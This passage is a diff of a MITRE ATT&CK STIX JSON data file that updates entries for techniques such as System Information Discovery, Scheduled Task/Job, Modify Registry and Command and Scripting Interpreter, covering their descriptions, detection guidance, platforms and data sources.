       "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS <code>systemsetup</code> command, but it requires administrative privileges.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)",
       "kill_chain_phases": [
@@ -408,14 +457,19 @@
       ],
       "external_references": [
         {
-          "source_name": "Amazon Describe Instance",
-          "url": "https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html",
-          "description": "Amazon. (n.d.). describe-instance-information. Retrieved March 3, 2020."
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1082",
+          "external_id": "T1082"
         },
         {
           "source_name": "capec",
           "url": "https://capec.mitre.org/data/definitions/312.html",
           "external_id": "CAPEC-312"
+        },
+        {
+          "source_name": "Amazon Describe Instance",
+          "url": "https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html",
+          "description": "Amazon. (n.d.). describe-instance-information. Retrieved March 3, 2020."
         },
         {
           "source_name": "Google Instances Resource",
@@ -426,50 +480,41 @@
           "source_name": "Microsoft Virutal Machine API",
           "url": "https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get",
           "description": "Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019."
-        },
-        {
-          "source_name": "mitre-attack",
-          "url": "https://attack.mitre.org/techniques/T1082",
-          "external_id": "T1082"
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations."
-      ],
+      "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.",
       "x_mitre_platforms": [
-        "AWS",
-        "Azure",
-        "GCP",
+        "IaaS",
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "AWS CloudTrail logs",
-        "Azure activity logs",
-        "Process command-line parameters",
-        "Process monitoring",
-        "Stackdriver logs"
+        "Command: Command Execution",
+        "Instance: Instance Metadata",
+        "Process: OS API Execution",
+        "Process: Process Creation"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_permissions_required": [
         "User"
       ],
       "x_mitre_contributors": [
         "Praetorian"
       ],
-      "x_mitre_version": "2.1"
+      "x_mitre_version": "2.2"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:37.379Z",
+      "created": "2017-05-31T21:30:56.776Z",
+      "modified": "2020-10-21T16:35:45.986Z",
       "name": "T1071: Application Layer Protocol",
-      "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.",
+      "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ",
       "kill_chain_phases": [
         {
           "kill_chain_name": "lockheed",
@@ -495,33 +540,26 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)"
-      ],
+      "x_mitre_detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "DNS records",
-        "Netflow/Enclave netflow",
-        "Network protocol analysis",
-        "Packet capture",
-        "Process monitoring",
-        "Process use of network"
+        "Network Traffic: Network Traffic Content",
+        "Network Traffic: Network Traffic Flow"
       ],
-      "x_mitre_network_requirements": [
-        "true"
-      ],
+      "x_mitre_is_subtechnique": false,
+      "x_mitre_network_requirements": true,
       "x_mitre_version": "2.0"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:36.978Z",
+      "created": "2017-05-31T21:30:46.977Z",
+      "modified": "2021-04-20T16:31:11.405Z",
       "name": "T1053: Scheduled Task/Job",
       "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges).",
       "kill_chain_phases": [
@@ -548,14 +586,14 @@
       ],
       "external_references": [
         {
-          "source_name": "capec",
-          "url": "https://capec.mitre.org/data/definitions/557.html",
-          "external_id": "CAPEC-557"
-        },
-        {
           "source_name": "mitre-attack",
           "url": "https://attack.mitre.org/techniques/T1053",
           "external_id": "T1053"
+        },
+        {
+          "source_name": "capec",
+          "url": "https://capec.mitre.org/data/definitions/557.html",
+          "external_id": "CAPEC-557"
         },
         {
           "source_name": "TechNet Task Scheduler Security",
@@ -566,20 +604,22 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
-      ],
+      "x_mitre_detection": "Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
       "x_mitre_platforms": [
+        "Containers",
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "File monitoring",
-        "Process command-line parameters",
-        "Process monitoring",
-        "Windows event logs"
+        "Command: Command Execution",
+        "Container: Container Creation",
+        "File: File Creation",
+        "File: File Modification",
+        "Process: Process Creation",
+        "Scheduled Job: Scheduled Job Creation"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_permissions_required": [
         "Administrator",
         "SYSTEM",
@@ -590,23 +630,23 @@
         "SYSTEM",
         "User"
       ],
-      "x_mitre_remote_support": "true",
+      "x_mitre_remote_support": true,
       "x_mitre_contributors": [
         "Alain Homewood, Insomnia Security",
         "Leo Loobeek, @leoloobeek",
         "Prashant Verma, Paladion",
         "Travis Smith, Tripwire"
       ],
-      "x_mitre_version": "2.0"
+      "x_mitre_version": "2.1"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:36.653Z",
+      "created": "2017-05-31T21:30:20.537Z",
+      "modified": "2020-05-26T19:21:25.974Z",
       "name": "T1005: Data from Local System",
-      "description": "Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.",
+      "description": "Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with the file system to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
       "kill_chain_phases": [
         {
           "kill_chain_name": "lockheed",
@@ -627,19 +667,17 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
-      ],
+      "x_mitre_detection": "Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "File monitoring",
-        "Process command-line parameters",
-        "Process monitoring"
+        "Command: Command Execution",
+        "File: File Access"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_system_requirements": [
         "Privileges to access certain files and directories"
       ],
@@ -649,8 +687,8 @@
       "type": "attack-pattern",
       "id": "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:38.828Z",
+      "created": "2018-04-18T17:59:24.739Z",
+      "modified": "2021-01-20T18:12:12.134Z",
       "name": "T1218: Signed Binary Proxy Execution",
       "description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.",
       "kill_chain_phases": [
@@ -673,23 +711,20 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity."
-      ],
+      "x_mitre_detection": "Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.",
       "x_mitre_platforms": [
         "Windows"
       ],
       "x_mitre_data_sources": [
-        "API monitoring",
-        "Binary file metadata",
-        "DLL monitoring",
-        "File monitoring",
-        "Loaded DLLs",
-        "Process command-line parameters",
-        "Process monitoring",
-        "Process use of network",
-        "Windows Registry"
+        "Command: Command Execution",
+        "File: File Creation",
+        "Module: Module Load",
+        "Network Traffic: Network Connection Creation",
+        "Process: OS API Execution",
+        "Process: Process Creation",
+        "Windows Registry: Windows Registry Key Modification"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_permissions_required": [
         "Administrator",
         "User"
@@ -710,8 +745,8 @@
       "type": "attack-pattern",
       "id": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:38.097Z",
+      "created": "2017-05-31T21:31:23.587Z",
+      "modified": "2020-08-13T20:02:49.641Z",
       "name": "T1112: Modify Registry",
       "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.",
       "kill_chain_phases": [
@@ -726,14 +761,14 @@
       ],
       "external_references": [
         {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1112",
+          "external_id": "T1112"
+        },
+        {
           "source_name": "capec",
           "url": "https://capec.mitre.org/data/definitions/203.html",
           "external_id": "CAPEC-203"
-        },
-        {
-          "source_name": "Microsoft 4657 APR 2017",
-          "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657",
-          "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4657(S): A registry value was modified. Retrieved August 9, 2018."
         },
         {
           "source_name": "Microsoft Reg",
@@ -741,24 +776,14 @@
           "description": "Microsoft. (2012, April 17). Reg. Retrieved May 1, 2015."
         },
         {
-          "source_name": "Microsoft RegDelNull July 2016",
-          "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull",
-          "description": "Russinovich, M. & Sharkey, K. (2016, July 4). RegDelNull v1.11. Retrieved August 10, 2018."
-        },
-        {
           "source_name": "Microsoft Reghide NOV 2006",
           "url": "https://docs.microsoft.com/sysinternals/downloads/reghide",
           "description": "Russinovich, M. & Sharkey, K. (2006, January 10). Reghide. Retrieved August 9, 2018."
         },
         {
-          "source_name": "Microsoft Remote",
-          "url": "https://technet.microsoft.com/en-us/library/cc754820.aspx",
-          "description": "Microsoft. (n.d.). Enable the Remote Registry Service. Retrieved May 1, 2015."
-        },
-        {
-          "source_name": "mitre-attack",
-          "url": "https://attack.mitre.org/techniques/T1112",
-          "external_id": "T1112"
+          "source_name": "TrendMicro POWELIKS AUG 2014",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/",
+          "description": "Santos, R. (2014, August 1). POWELIKS: Malware Hides In Windows Registry. Retrieved August 9, 2018."
         },
         {
           "source_name": "SpectorOps Hiding Reg Jul 2017",
@@ -766,27 +791,37 @@
           "description": "Reitz, B. (2017, July 14). Hiding Registry keys with PSReflect. Retrieved August 9, 2018."
         },
         {
-          "source_name": "TrendMicro POWELIKS AUG 2014",
-          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/poweliks-malware-hides-in-windows-registry/",
-          "description": "Santos, R. (2014, August 1). POWELIKS: Malware Hides In Windows Registry. Retrieved August 9, 2018."
+          "source_name": "Microsoft Remote",
+          "url": "https://technet.microsoft.com/en-us/library/cc754820.aspx",
+          "description": "Microsoft. (n.d.). Enable the Remote Registry Service. Retrieved May 1, 2015."
+        },
+        {
+          "source_name": "Microsoft 4657 APR 2017",
+          "url": "https://docs.microsoft.com/windows/security/threat-protection/auditing/event-4657",
+          "description": "Miroshnikov, A. & Hall, J. (2017, April 18). 4657(S): A registry value was modified. Retrieved August 9, 2018."
+        },
+        {
+          "source_name": "Microsoft RegDelNull July 2016",
+          "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/regdelnull",
+          "description": "Russinovich, M. & Sharkey, K. (2016, July 4). RegDelNull v1.11. Retrieved August 10, 2018."
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016)."
-      ],
+      "x_mitre_detection": "Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).",
       "x_mitre_platforms": [
         "Windows"
       ],
       "x_mitre_data_sources": [
-        "File monitoring",
-        "Process command-line parameters",
-        "Process monitoring",
-        "Windows Registry",
-        "Windows event logs"
+        "Command: Command Execution",
+        "Process: OS API Execution",
+        "Process: Process Creation",
+        "Windows Registry: Windows Registry Key Creation",
+        "Windows Registry: Windows Registry Key Deletion",
+        "Windows Registry: Windows Registry Key Modification"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_permissions_required": [
         "Administrator",
         "SYSTEM",
@@ -800,14 +835,14 @@
         "David Lu, Tripwire",
         "Travis Smith, Tripwire"
       ],
-      "x_mitre_version": "1.1"
+      "x_mitre_version": "1.2"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:36.653Z",
+      "created": "2017-05-31T21:30:27.342Z",
+      "modified": "2021-04-24T13:13:49.594Z",
       "name": "T1016: System Network Configuration Discovery",
       "description": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).\n\nAdversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
       "kill_chain_phases": [
@@ -822,31 +857,32 @@
       ],
       "external_references": [
         {
-          "source_name": "capec",
-          "url": "https://capec.mitre.org/data/definitions/309.html",
-          "external_id": "CAPEC-309"
-        },
-        {
           "source_name": "mitre-attack",
           "url": "https://attack.mitre.org/techniques/T1016",
           "external_id": "T1016"
+        },
+        {
+          "source_name": "capec",
+          "url": "https://capec.mitre.org/data/definitions/309.html",
+          "external_id": "CAPEC-309"
         }
       ],
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
-      ],
+      "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "Process command-line parameters",
-        "Process monitoring"
+        "Command: Command Execution",
+        "Process: OS API Execution",
+        "Process: Process Creation",
+        "Script: Script Execution"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_permissions_required": [
         "User"
       ],
@@ -856,10 +892,10 @@
       "type": "attack-pattern",
       "id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
-      "created": "2018-08-03T19:54:02.821Z",
-      "modified": "2020-07-27T14:54:37.379Z",
+      "created": "2017-05-31T21:30:49.546Z",
+      "modified": "2021-04-27T19:21:06.164Z",
       "name": "T1059: Command and Scripting Interpreter",
-      "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript/JScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.",
+      "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.",
       "kill_chain_phases": [
         {
           "kill_chain_name": "lockheed",
@@ -880,32 +916,32 @@
       "object_marking_refs": [
         "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
       ],
-      "x_mitre_detection": [
-        "Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.\n\nIf scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script."
-      ],
+      "x_mitre_detection": "Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.\n\nIf scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.",
       "x_mitre_platforms": [
         "Linux",
-        "Windows",
-        "macOS"
+        "macOS",
+        "Network",
+        "Windows"
       ],
       "x_mitre_data_sources": [
-        "PowerShell logs",
-        "Process command-line parameters",
-        "Process monitoring",
-        "Windows event logs"
+        "Command: Command Execution",
+        "Module: Module Load",
+        "Process: Process Creation",
+        "Script: Script Execution"
       ],
+      "x_mitre_is_subtechnique": false,
       "x_mitre_permissions_required": [
         "User"
       ],
-      "x_mitre_remote_support": "false",
-      "x_mitre_version": "2.0"
+      "x_mitre_remote_support": false,
+      "x_mitre_version": "2.1"
     },
     {
       "type": "attack-pattern",
       "id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18",
       "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
